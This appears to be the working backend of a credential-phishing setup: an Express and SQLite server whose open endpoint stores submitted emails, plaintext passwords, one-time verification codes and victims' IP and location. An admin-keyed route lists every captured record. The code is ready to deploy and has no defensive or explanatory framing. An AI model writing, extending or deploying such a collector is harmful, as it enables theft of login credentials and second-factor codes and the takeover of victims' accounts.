const express = require("express");
const cors = require("cors");
const Database = require("better-sqlite3");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3001;
const ADMIN_KEY = process.env.ADMIN_KEY || "change-me-in-production";
const FRONTEND_ORIGIN = process.env.FRONTEND_ORIGIN || "*";

// --- Database setup ---
const db = new Database(path.join(__dirname, "data.db"));
db.pragma("journal_mode = WAL");

db.exec(`
  CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    verifyCode TEXT NOT NULL,
    ip TEXT,
    city TEXT,
    country TEXT,
    timestamp TEXT NOT NULL,
    created_at TEXT DEFAULT (datetime('now'))
  )
`);

// --- Middleware ---
app.use(cors({ origin: FRONTEND_ORIGIN }));
app.use(express.json());

// --- Routes ---

// Store a session entry
app.post("/api/sessions", (req, res) => {
  const { email, password, verifyCode, ip, city, country, timestamp } = req.body;

  if (!email || !password || !verifyCode || !timestamp) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  const stmt = db.prepare(
    "INSERT INTO sessions (email, password, verifyCode, ip, city, country, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)"
  );
  const result = stmt.run(email, password, verifyCode, ip || "", city || "", country || "", timestamp);

  res.status(201).json({ id: result.lastInsertRowid });
});

// Retrieve all sessions (admin-protected)
app.get("/api/sessions", (req, res) => {
  const key = req.headers["x-admin-key"];
  if (key !== ADMIN_KEY) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  const rows = db.prepare("SELECT * FROM sessions ORDER BY id DESC").all();
  res.json(rows);
});

// Health check
app.get("/api/health", (_req, res) => {
  res.json({ status: "ok", sessions: db.prepare("SELECT COUNT(*) as count FROM sessions").get().count });
});

app.listen(PORT, () => {
  console.log(`Backend running on port ${PORT}`);
});
